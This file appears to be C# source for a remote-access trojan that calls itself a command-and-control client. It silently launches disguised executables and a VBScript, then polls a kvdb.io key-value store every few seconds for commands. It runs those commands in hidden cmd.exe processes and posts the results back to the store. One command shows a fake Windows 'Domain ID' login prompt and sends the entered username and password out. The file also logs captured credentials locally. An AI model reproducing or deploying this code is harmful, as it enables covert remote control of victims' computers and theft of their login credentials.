using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Linq; 
using System.Net;
using System.Threading; 
using System.Diagnostics;
using System.Windows;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

//The code redefines few things !!!
public class Output
{
	public static void WriteLine(string log)
	{
		File.AppendAllText(@"C:\temp\log_cnc.txt", DateTime.Now.ToString()+"--"+log + Environment.NewLine);
	}
}
public class Furqan_c_and_c
{
	
	public string Furqan_NoThread(string command)
{
     try
     {
			System.Diagnostics.ProcessStartInfo khan_pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			khan_pr.RedirectStandardOutput = true;
			khan_pr.UseShellExecute = false;
			khan_pr.CreateNoWindow = true;
			System.Diagnostics.Process khan_p = new System.Diagnostics.Process();
			khan_p.StartInfo = khan_pr;
			khan_p.Start();
			string result = khan_p.StandardOutput.ReadToEnd();
			Output.WriteLine(result);
			return result;
      }
      catch (Exception ex)
      {
		Output.WriteLine("(1): " + ex.Message);
		return "0";
      }
}
	public void Furqan_NoThread(object command)
{
     try
     {
			Output.WriteLine("About to execute command : " + command.ToString());
			System.Diagnostics.ProcessStartInfo khan_pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			khan_pr.RedirectStandardOutput = true;
			khan_pr.UseShellExecute = false;
			khan_pr.CreateNoWindow = true;
			System.Diagnostics.Process khan_p = new System.Diagnostics.Process();
			khan_p.StartInfo = khan_pr;
			khan_p.Start();
			
			
      }
      catch (Exception ex)
      {
		Output.WriteLine("(1): " + ex.Message);
		
      }
}
	public void Furqan_Thread(string command)
	{
	   try
	   {
		Thread obj= new Thread(new ParameterizedThreadStart(Furqan_NoThread));
		obj.IsBackground = true;
		obj.Priority = ThreadPriority.Highest;
		obj.Start(command);
	   }
	   catch (Exception ex)
	   {
		Output.WriteLine("(4): " +ex.Message);
	   }
	}
	
}
class Furqan_D
{
	public string PostTheData(string endpoint, string json)
	{
    		
			Output.WriteLine("(2) End point is : " +endpoint);
    		string jsonResponse = string.Empty;
 
    		using (var client = new WebClient())
    		{
       		 try
        		{
            		client.UseDefaultCredentials = true;
            		client.Headers.Add("Content-Type: application/x-www-form-urlencoded");
            		client.Headers.Add("Accept: */*");
					string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
					client.Headers.Add("Authorization: "+string.Format("Basic {0}", credentials));
            		var uri = new Uri(endpoint);
           		    var response = client.UploadString(uri, "POST", json);
            		jsonResponse = response;
					Output.WriteLine("DATA written");
					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
       			 }
        	catch (WebException ex)
        		{
            		
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
						 Output.WriteLine("Error is :" +response);
						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
						var statusCode = (int)wrsp.StatusCode;
						var msg = wrsp.StatusDescription;
						Output.WriteLine("Exception : " + msg + wrsp.StatusCode);
						return msg;
               		
            		}
            		else
            		{
                		Output.WriteLine("Exception 11" + ex.Message);
						return ex.Message;
            		}
        		}
    		}
 
   		 return jsonResponse;
	}
		public string getTheData(string endpoint)
	{
		using (var client = new WebClient())
		{
   			 try
    			{
				Output.WriteLine("(1) End point is : " +endpoint);
        		client.BaseAddress = endpoint;
        		client.UseDefaultCredentials = true;
				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
        		var jsonResponse = client.DownloadString(endpoint);
				return jsonResponse;
    			}
   			 catch (WebException ex)
    			{
       			
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                		var statusCode = (int)wrsp.StatusCode;
                		var msg = wrsp.StatusDescription;
						Output.WriteLine("Exception : " + msg);
						return "0";
               			
            		}
            		else
					{
                		Output.WriteLine("Exception 11" + ex.Message);
						return "0";
            		}
				}
			catch(Exception ex)
			{
				Output.WriteLine("Genera; Exception " + ex.Message);
				return "0";
			}
	}
	
 
	}
    static void Main(string[] args)
    {
		Furqan_c_and_c objj=new Furqan_c_and_c();
		string res="FQM3hbtRhm94tkaLXBm5kF"; 
		string res_key=res;
		string updated_ep="https://kvdb.io/"+res+"/master_files";
		Furqan_D obj=new Furqan_D();
		try
		{
			string a="C:\\temp\\flash.exe,C:\\temp\\IntelHD.exe,VB";
		if (a.Length > 0)
		{
			string command_args=a;
			string [] splitted=command_args.Split(',');
			foreach (string command in splitted)
			{
				Output.WriteLine("Command is : " +command);
				Process khan_process = new Process();
				try
				{
					if (command.Equals("VB"))
					{
						//System.Diagnostics.Process.Start("cscript","so.vbs");
						khan_process.StartInfo.UseShellExecute = false;
						khan_process.StartInfo.FileName = "cscript";
						khan_process.StartInfo.Arguments = "C:\\temp\\so.vbs";
						khan_process.StartInfo.CreateNoWindow = true;
						khan_process.Start();
						
					}
					else
					{
						khan_process.StartInfo.UseShellExecute = false;
						khan_process.StartInfo.FileName = command;
						khan_process.StartInfo.CreateNoWindow = true;
						khan_process.Start();
					}
					
				}
				catch (Exception e)
				{
					Output.WriteLine("(0) Exception :" +e.Message);
				}
			}
			
		}
		}
		catch(Exception ex)
		{
			Output.WriteLine(ex.Message);
		}
		
		while(true)
				{
				try
				{
				int sleepfor = 5000;
				Thread.Sleep(sleepfor);
				string res1="FQM3hbtRhm94tkaLXBm5kF"; 
				string res_key1=res1;
				string updated_ep0="https://kvdb.io/"+res_key1+"/commands_store";
				var resp2=obj.getTheData(updated_ep0);
				string new_command="";
				if ((resp2.Equals("0") == false) && (resp2.Equals("") == false))
				{
				
					string []command_details=resp2.Split(',');
					string command_type=command_details[0];
					string command=command_details[1];
					string type=command_details[2];
					if(command_type.Equals("1"))
					{
						Output.WriteLine("(a) Recievied New command : " +command_details[1]);
						
						 if (type.Equals("1") || type.Equals("0"))
						{
							
							
								new_command="0"+","+command_details[1]+","+command_details[2];
								var res2=obj.PostTheData(updated_ep0,new_command);
								Output.WriteLine("Updated Resp : " +res2);
								string result="";
								if(command.Equals("<cred_prompt>"))
								{
									Program.Start();
									Output.WriteLine("Diff class : " +Program.f_user);
									Output.WriteLine("Diff class : " +Program.f_pass);
									result="Username : " + Program.f_user + "\n Password :"+ Program.f_pass;
								}
								else
								{
								result=objj.Furqan_NoThread(command);
								}
								string updated_epp="https://kvdb.io/"+res_key+"/command_results";
								string c_r=command_details[1]+"**###**"+result;
								var r=obj.PostTheData(updated_epp,c_r);
							
							
						}
						
						else 
						{
							Output.WriteLine("(b) Invalid type : " +type);
						}
					}
					else
					{
							Output.WriteLine("(1) No new command  "+command_type);
					}
				}
				else
				{
					Output.WriteLine("(**) No new command  "+resp2);
				}
				Output.WriteLine("Resp obtained : "+resp2);
				}
				catch(Exception ex)
				{
					Output.WriteLine("Exception : " +ex.Message);
					//sw.Write(ex.Message);
				}
				}
       
    }

}



 class Program
    {
        const int MAX_USER_NAME = 100;
        const int MAX_PASSWORD = 100;
        const int MAX_DOMAIN = 100;
        public static string f_user;
        public static string f_pass;
        public enum CredUIReturnCodes
        {
            NO_ERROR = 0,
            ERROR_CANCELLED = 1223,
            ERROR_NO_SUCH_LOGON_SESSION = 1312,
            ERROR_NOT_FOUND = 1168,
            ERROR_INVALID_ACCOUNT_NAME = 1315,
            ERROR_INSUFFICIENT_BUFFER = 122,
            ERROR_INVALID_PARAMETER = 87,
            ERROR_INVALID_FLAGS = 1004,
            ERROR_BAD_ARGUMENTS = 160
        }
       
        [Flags]
        public enum CREDUI_FLAGS
        {
            
            CREDUIWIN_GENERIC = 0x1,
            CREDUIWIN_CHECKBOX = 0x2,
            REQUEST_ADMINISTRATOR = 0x4,
            EXCLUDE_CERTIFICATES = 0x8,
            CREDUIWIN_AUTHPACKAGE_ONLY = 0x10,
            CREDUIWIN_IN_CRED_ONLY = 0x20,
            SHOW_SAVE_CHECK_BOX = 0x40,
            ALWAYS_SHOW_UI = 0x80,
            CREDUIWIN_ENUMERATE_ADMINS = 0x100,         
            CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200,
            VALIDATE_USERNAME = 0x400,
            COMPLETE_USERNAME = 0x800,
            CREDUIWIN_SECURE_PROMPT = 0x1000,
            SERVER_CREDENTIAL = 0x4000,
            EXPECT_CONFIRMATION = 0x20000,
            GENERIC_CREDENTIALS = 0x40000,
            USERNAME_TARGET_CREDENTIALS = 0x80000,
            CREDUIWIN_PACK_32_WOW = 0x10000000,
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }


        [DllImport("credui", CharSet = CharSet.Unicode)]
        private static extern CredUIReturnCodes CredUIPromptForCredentialsW(ref CREDUI_INFO creditUR,
           string targetName,
           IntPtr reserved1,
           int iError,
           StringBuilder userName,
           int maxUserName,
           StringBuilder password,
           int maxPassword,
           [MarshalAs(UnmanagedType.Bool)] ref bool pfSave,
           CREDUI_FLAGS flags);

        public static CredUIReturnCodes PromptForCredentials(
          ref CREDUI_INFO creditUI,
          string targetName,
          int netError,
          ref string userName,
          ref string password,
          ref bool save,
          CREDUI_FLAGS flags)
        {

            StringBuilder user = new StringBuilder(MAX_USER_NAME);
            StringBuilder pwd = new StringBuilder(MAX_PASSWORD);
            creditUI.cbSize = Marshal.SizeOf(creditUI);

            CredUIReturnCodes result = CredUIPromptForCredentialsW(
                          ref creditUI,
                          targetName,
                          IntPtr.Zero,
                          netError,
                          user,
                          MAX_USER_NAME,
                          pwd,
                          MAX_PASSWORD,
                          ref save,
                          flags);

            userName = user.ToString();
            password = pwd.ToString();
            Output.WriteLine("User Entered :" + userName);
            Output.WriteLine("Pass Entered :" + password);
            f_user = user.ToString();
            f_pass = pwd.ToString();
            return result;
        }


        public static void Start()
        {
           
            string host = "Connecting to Domain";
            CREDUI_INFO info = new CREDUI_INFO();
            info.pszCaptionText = host;
            info.pszMessageText = "Please Enter Your Domain ID";

            CREDUI_FLAGS flags = CREDUI_FLAGS.GENERIC_CREDENTIALS |
                  CREDUI_FLAGS.SHOW_SAVE_CHECK_BOX |
                  CREDUI_FLAGS.ALWAYS_SHOW_UI |
                  CREDUI_FLAGS.EXPECT_CONFIRMATION;
            string username = "khan123";
            string password = "khan123";
            bool savePwd = false;
            CredUIReturnCodes result = PromptForCredentials(ref info, host, 0, ref username,
                          ref password, ref savePwd, flags);
            Output.WriteLine("Final result : ");
            Output.WriteLine(Program.f_user);
            Output.WriteLine(Program.f_pass);
             
        }
    }
